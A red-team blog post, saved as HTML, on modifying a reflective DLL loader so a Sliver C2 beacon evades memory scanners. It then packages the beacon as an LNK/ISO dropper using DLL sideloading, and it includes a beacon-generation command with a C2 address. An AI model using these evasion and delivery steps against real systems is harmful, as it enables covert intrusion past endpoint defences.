@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Customize the Loader | 0x0ff537</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="First I would like to mention that this is more about my own learning process other than a proper tutorial. I&rsquo;ve been playing around with Sliver framework a lot lately, if you&rsquo;ve done it too then you know you can generate beacons in different formats including shellcode, this is cool, right? Because you can just inject it into memory and the shellcode will reflectively load a DLL that conatins the actual beacon payload, but this process leaves some memory artifacts that can be detected by AVs, EDRs or memory scanners like PE-sieve.">
+    <meta name="generator" content="Hugo 0.101.0" />
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+  
+
+    
+    
+    
+      
+
+    
+
+    
+    
+    <meta property="og:title" content="Customize the Loader" />
+<meta property="og:description" content="First I would like to mention that this is more about my own learning process other than a proper tutorial. I&rsquo;ve been playing around with Sliver framework a lot lately, if you&rsquo;ve done it too then you know you can generate beacons in different formats including shellcode, this is cool, right? Because you can just inject it into memory and the shellcode will reflectively load a DLL that conatins the actual beacon payload, but this process leaves some memory artifacts that can be detected by AVs, EDRs or memory scanners like PE-sieve." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0x0ff537.github.io/post/customizeloader/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-01-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-01-27T00:00:00+00:00" />
+
+<meta itemprop="name" content="Customize the Loader">
+<meta itemprop="description" content="First I would like to mention that this is more about my own learning process other than a proper tutorial. I&rsquo;ve been playing around with Sliver framework a lot lately, if you&rsquo;ve done it too then you know you can generate beacons in different formats including shellcode, this is cool, right? Because you can just inject it into memory and the shellcode will reflectively load a DLL that conatins the actual beacon payload, but this process leaves some memory artifacts that can be detected by AVs, EDRs or memory scanners like PE-sieve."><meta itemprop="datePublished" content="2023-01-27T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2023-01-27T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1216">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Customize the Loader"/>
+<meta name="twitter:description" content="First I would like to mention that this is more about my own learning process other than a proper tutorial. I&rsquo;ve been playing around with Sliver framework a lot lately, if you&rsquo;ve done it too then you know you can generate beacons in different formats including shellcode, this is cool, right? Because you can just inject it into memory and the shellcode will reflectively load a DLL that conatins the actual beacon payload, but this process leaves some memory artifacts that can be detected by AVs, EDRs or memory scanners like PE-sieve."/>
+
+	
+  </head>
+
+  <body class="ma0 sans-serif">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        <img src="/images/logo.png" class="w100 mw5-ns" alt="0x0ff537" />
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/about/" title="About me page">
+              About me
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/post/" title="Posts page">
+              Posts
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+<div class="ananke-socials">
+  
+    <a href="https://github.com/0x0ff537/" target="_blank" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    <a href="https://twitter.com/0x0ff53t/" target="_blank" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked">
+          
+        POSTS
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+      
+      <a href="https://twitter.com/share?url=https://0x0ff537.github.io/post/customizeloader/&amp;text=Customize%20the%20Loader" class="ananke-social-link twitter no-underline" aria-label="share on Twitter">
+        
+        <span class="icon"> <svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+        
+      </a>
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">Customize the Loader</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2023-01-27T00:00:00Z">January 27, 2023</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr0 w-100"><p>First I would like to mention that this is more about my own learning process other than a proper tutorial. I&rsquo;ve been playing around with Sliver framework a lot lately, if you&rsquo;ve done it too then you know you can generate beacons in different formats including shellcode, this is cool, right? Because you can just inject it into memory and the shellcode will reflectively load a DLL that conatins the actual beacon payload, but this process leaves some memory artifacts that can be detected by AVs, EDRs or memory scanners like <a href="https://github.com/hasherezade/pe-sieve">PE-sieve</a>. The reflective DLL will be copied in a newly allocated memory space with RWX (read, write and execute) permissions which is totally an IoC detected by any decent security solution. Also, I noticed that the shellcode will patch amsi.dll and wldp.dll, apart from deleting the DOS and NT headers of the reflected DLL, which is great.</p>
+<p>Here we can see the RWX memory region allocated by the shellcode:</p>
+<p><img src="/images/basic_loader_rwx.png" alt="rwx_memory"></p>
+<p>And the results of pe-sieve:</p>
+<p><img src="/images/pesieve_basic_loader.png" alt="pesieve_basic_loader"></p>
+<p>So, what can we do about the RWX section? Well, we can try to create our own loader (which would be a great learning experience) but instead we&rsquo;ll modify the original <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">Reflective DLL Injection</a> code to be able to assign the corresponding permissions for each DLL&rsquo;s section, and to even go stealthier we&rsquo;ll delete DOS and NT headers as well.</p>
+<h2 id="rdi-source-code-review">RDI source code review</h2>
+<p>I won&rsquo;t explain in depth Reflective DLL Injection technique, I expected the reader to have some knowledge about how it works or encourage them to do some research. To be able to use the original Stephen Fewer&rsquo;s code we should have the DLL&rsquo;s source code as well and unfortunately this is not the case, instead we have an already compiled Sliver&rsquo;s beacon DLL. But, we can modify the original RDI source code to use it with an already compiled PE file, in such case we&rsquo;ll have to perform self injection instead of remote injection.</p>
+<p>Taking a look at the original RDI code we can see that the function that will do all the hard work is ReflictiveLoader(). The first step, called &ldquo;step 0&rdquo;, of this function is to find the location of MZ magic bytes which will let us know the DLL&rsquo;s base address:</p>
+<p><img src="/images/reflective_0.png" alt="reflective_0"></p>
+<p>Once it finds the DOS header, ReflectiveLoader() function will resolve some functions from kernel32 and ntdll it needs for further steps. After that it&rsquo;ll allocate some memory and copy each section of the DLL into this new memory space:</p>
+<p><img src="/images/reflective_2.png" alt="reflective_2">
+<img src="/images/reflective_3.png" alt="reflective_3"></p>
+<p>And after some other steps like process import table and relocations, ReflectiveLoader() will get the DLL&rsquo;s entry point out of the Optional header and call DLLMain() which will trigger the payload:</p>
+<p><img src="/images/reflective_6.png" alt="reflective_6"></p>
+<p>This is the relevant information we need for the changes we&rsquo;re going to do.</p>
+<h2 id="modifying-the-code">Modifying the code</h2>
+<p>To do some tests we&rsquo;ll create a simple executable that will store the whole Sliver DLL&rsquo;s bytes into a variable and pass its address as a pointer to ReflectiveLoader():</p>
+<p><img src="/images/main.png" alt="loader_main"></p>
+<p>To achieve this we have to modify ReflectiveLoader&rsquo;s definition so the function accepts arguments:</p>
+<p><img src="/images/func_definition.png" alt="func_definition"></p>
+<p>Then, in &ldquo;step 0&rdquo;, we&rsquo;ll store payload&rsquo;s address pointer in uiLibraryAddress variable:</p>
+<p><img src="/images/step0.png" alt="step0"></p>
+<p>Actually the payload&rsquo;s address pointer is pointing exactly to the DOS header, so the while loop will immediately continue execution, I mean no loop.</p>
+<p>The next step is to set the proper permissions for each section. We can&rsquo;t do it in &ldquo;step 3&rdquo; because when relocations are processed some sections will still need writing permissions, so we&rsquo;ll add an extra step in the code to change permissions just before calling DLLMain().</p>
+<p><img src="/images/extra_step.png" alt="extra_step"></p>
+<p>Each section has its own header with specific values including the expecting set of permissions. This value is stored in the Characteristics field. Here we can see the section header structure definition according to Microsoft&rsquo;s documentation:</p>
+<p><img src="/images/section_header.png" alt="section_header"></p>
+<p>If we read the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header">Characteristics</a> definition we can see it contains many values but the ones we are interested on are stored in the upper byte:</p>
+<p><img src="/images/characteristics_values.png" alt="characteristics_values"></p>
+<p>So we&rsquo;ll need to right shift the position by 28 bits (because Characteristics is a DWORD, it means 32 bits long):</p>
+<p><img src="/images/shifted_value.png" alt="shifted_values"></p>
+<p>If it&rsquo;s not clear at all I&rsquo;ll try to explain it. If we found that the upper byte is equal to 0x6 then it means read and execute permissions are set for the section because, according to Microsoft&rsquo;s documentation, read permissions = 0x4 and execute permissions = 0x2 then 0x4 + 0x2 = 0x6.</p>
+<p>After we obtain the expected permissions we can use VirtualProtect function to change the permissions of the section. It&rsquo;s worth to mention that VirtualProtect will apply the permissions to a whole page size, by default the page size is 4096 bytes, so each section needs to be rounded to the next page size.</p>
+<p>After we have set the proper permissions for each section we can proceed to call DLLMain() and delete DOS and Optional headers:</p>
+<p><img src="/images/call_dllmain.png" alt="call_dllmain"></p>
+<h2 id="running-the-test">Running the test</h2>
+<p>To run a test we&rsquo;ll create a Sliver&rsquo;s beacon DLL with the next command:</p>
+<pre tabindex="0"><code>sliver &gt; generate beacon -m 192.168.188.163:8443 -S 5 -R
+</code></pre><p>It&rsquo;s important to use -R flag to run the implant entrypoint from DLLMain(). Once the DLL is generated we&rsquo;ll need to get all its bytes and store them in a variable, luckily we can use xxd for this task:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xxd -i MANUAL_KICK.dll | sed <span style="color:#e6db74">&#39;s/MANUAL_KICK_dll/payload/g&#39;</span> &gt; out.h
+</span></span></code></pre></div><p>In this case the DLL generated by Sliver is called MANUAL_KICK. We are saving it to a file called out.h and rename the variable name to payload.</p>
+<p>Then, we&rsquo;ll need to add out.h as an include in our loader test code. Also, we&rsquo;ll rename the modified RDI code from ReflectiveLoader.c to ReflectiveLoaderLibrary.h and include it as well:</p>
+<p><img src="/images/loader_test.png" alt="loader_test"></p>
+<p>Now we can compile the code and run it. Using Process Hacker we can inspect the memory:</p>
+<p><img src="/images/loader_test_results.png" alt="loader_test_results"></p>
+<p>As we can see there&rsquo;s no RWX section anymore, instead each section has its expected permissions and we have successfully deleted the DOS and Optional headers. Also, if we run pe-sieve we can see that there are no suspicious memory artifacts:</p>
+<p><img src="/images/pesieve_loader_test.png" alt="pesieve_loader_test"></p>
+<h2 id="weaponizing-it">Weaponizing it</h2>
+<p>Just for fun we&rsquo;ll create a dropper similar to what many APTs use in their attacks. It will be a LNK file that will open a Word document and run RuntimeBroker.exe, a Microsoft&rsquo;s signed binary. We&rsquo;ll use a technique called DLL sideloading, if you want to know more about this technique I&rsquo;ve written a <a href="https://0x0ff537.github.io/post/dllproxying/">post</a> about it.</p>
+<p>RuntimeBroker.exe loads a DLL called rmclient.dll, this is going to be our hijacked DLL. So, let&rsquo;s create the malicious file and proxy the imported function to the original DLL:</p>
+<p><img src="/images/malicious_dll.png" alt="malicious_dll"></p>
+<p>After compiling it we&rsquo;ll rename our malicious DLL to rmclient.dll and place all the needed files in a directory called Trojan and pack it inside an ISO file to avoid the mark of the web, for some files we&rsquo;ll set the Hidden attribute:</p>
+<p><img src="/images/hidden_files.png" alt="hidden_files"></p>
+<p>Now, we&rsquo;ll untick Hidden items and make sure that Real-time Protection is on:</p>
+<p><img src="/images/defender_on.png" alt="defender_on"></p>
+<p>Then after double-clicking the LNK file Word is opened:</p>
+<p><img src="/images/resume_doc.png" alt="resume_doc"></p>
+<p>And we get a connection back from the beacon:</p>
+<p><img src="/images/sliver.png" alt="sliver"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This is just an example of how we can modify an already existing code to fit our needs and achieve our goals. Obviously this code still have memory artifacts, e.g. the reflective loaded DLL is not mapped to a file in disk which is suspicious. So, you can improve it much more to be used in your Red Team operations. Keep practicing, keep coding and keep hacking.</p>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://0x0ff537.github.io" >
+    &copy;  0x0ff537 2023 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+    <a href="https://github.com/0x0ff537/" target="_blank" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    <a href="https://twitter.com/0x0ff53t/" target="_blank" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
